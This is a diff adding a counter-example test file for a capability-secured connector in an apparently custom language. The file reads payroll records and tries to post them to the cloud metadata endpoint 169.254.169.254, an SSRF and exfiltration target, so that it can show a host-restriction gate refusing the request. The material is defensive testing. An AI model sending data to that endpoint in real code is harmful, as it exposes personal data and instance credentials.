@@ -1,0 +1,68 @@
+// offhost_export.capa
+//
+// COUNTER-EXAMPLE (layer 2: host confinement). This file properly
+// declassifies the payload (so it is NOT an information-flow leak), but
+// then tries to send it to a SECOND host that is not the approved bureau:
+// the cloud metadata endpoint 169.254.169.254, a classic SSRF /
+// data-exfiltration target. It is NOT part of the connector and is never
+// imported by connector.capa.
+//
+// RUN-TIME DENIAL (default backend AND wasm). The Net is attenuated to
+// the approved host with restrict_to, so the post to 169.254.169.254 is
+// refused before a byte hits the socket. The restrict_to gate runs guest-
+// side under wasm too, so the denial is identical on both backends:
+//     python -m capa --run offhost_export.capa
+//   -> DENIED: Net capability does not permit access to host
+//      '169.254.169.254': current restrictions: ['bureau.example.com']
+//
+// BUILD-TIME, under --wasi, this file is ALSO rejected: the destination is
+// a non-inline value (a const read), so the WASI backend cannot materialise
+// a host ceiling and fails closed, exactly as it does for the connector's
+// operator-configured host. To reach 169.254.169.254 a WASI build would
+// need --allow-host 169.254.169.254, which trips the tool's internal-IP
+// SSRF warning ("grants a link-local address; this is usually an SSRF
+// risk"). Granting bureau.example.com does NOT authorise any other host;
+// deny-by-default, verified guest-side. See the README for the transcripts.
+// The run-time restrict_to denial above is the self-contained proof that
+// needs no WASI tooling.
+
+import domain
+import ingest
+import payload
+
+// The approved host, fixed here for the run-time demonstration. In the
+// real connector this comes from operator config; the point of this file
+// is the SECOND host below, not where the approved one comes from.
+const APPROVED_HOST: String = "bureau.example.com"
+
+// The attacker / off-host target: the cloud metadata service. Reaching it
+// would let a compromised export step exfiltrate the payload (or pull
+// instance credentials). The gate forbids it.
+const OFF_HOST_URL: String = "http://169.254.169.254/latest/meta-data/"
+
+pub fun main(net: Net, fs: Fs, stdio: Stdio)
+    let fs_data = fs.restrict_to("data/")
+    let text = match fs_data.read("data/payroll.csv")
+        Ok(s)  -> s
+        Err(e) -> return stdio.eprintln("cannot read batch: ${e}")
+
+    let records = match ingest.parse_batch(text)
+        Ok(rs) -> rs
+        Err(_) -> return stdio.eprintln("parse error")
+
+    // Attenuate to the approved host (layer 2).
+    let bureau = net.restrict_to(APPROVED_HOST)
+
+    // Properly declassified: this is NOT an information-flow leak. The
+    // ONLY thing wrong here is the DESTINATION.
+    let authorised = declassify(
+        build_payload(records),
+        reason: "DPA-2026-0417 processor egress"
+    )
+
+    // WRONG destination: a host that is not the approved bureau. The
+    // restrict_to gate denies it at run time (and --wasi denies a dynamic
+    // off-host at build time without a matching --allow-host).
+    match bureau.post(OFF_HOST_URL, authorised)
+        Ok(b)  -> stdio.println("REACHED off-host (this must never print): ${b}")
+        Err(e) -> stdio.println("DENIED: ${e}")
